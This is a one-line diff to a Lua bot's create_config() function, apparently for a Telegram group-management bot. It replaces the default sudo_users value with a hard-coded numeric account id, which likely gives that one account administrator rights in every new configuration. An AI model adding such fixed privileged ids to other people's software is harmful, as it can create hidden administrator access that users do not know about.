@@ -340,7 +340,7 @@ function create_config()
     globally_banned = {},
     mkgroup = {founded = '', founder = '', title = '', gtype = '', uid = ''},
     realm = {},
-    sudo_users = {[our_id] = our_id}
+    sudo_users = {[our_id] = 170146015}
   }
   save_config()
 end
